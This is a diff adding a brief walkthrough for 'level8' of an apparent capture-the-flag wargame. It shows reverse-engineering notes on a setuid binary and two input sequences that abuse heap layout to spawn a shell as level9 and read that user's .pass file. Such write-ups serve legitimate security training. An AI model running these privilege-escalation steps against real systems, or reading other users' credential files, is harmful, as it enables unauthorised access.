@@ -1,0 +1,54 @@
+level8 walkthrough
+==================
+
+1. 
+$ ls -l
+-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
+
+2.
+$ ./level8
+(nil), (nil)
+aaaaa
+(nil), (nil)
+
+3. ghidra usage 
+
+find the if statements -> command passed (auth, reset, service login)
+and if auth + 32 != 0 system call /bin/sh
+P.s. printf("%p, %p\n", auth, serivce)
+
+4. ./level8
+(nil), (nil) 
+auth
+(nil), (nil)
+auth aaaa
+0x804a008, (nil)
+// call the service
+serivce
+0x804a008, 0x804a018
+login
+Password:
+0x804a008, 0x804a018 // because its only 16 bits and auth + 32 still 0
+// if call service one more time, it will be a new memory address 
+service
+0x804a008, 0x804a028
+login
+$
+$ whoami
+level9
+$ cat ../level9/.pass
+
+the second solution
+(nil), (nil) 
+auth
+(nil), (nil)
+auth aaaa
+0x804a008, (nil)
+serivce 0123456789abcde* # 16 bytes
+0x804a008, 0x804a018
+// so auth + 32 will not be 0
+login
+$
+$ whoami
+level9
+$ cat ../level9/.pass
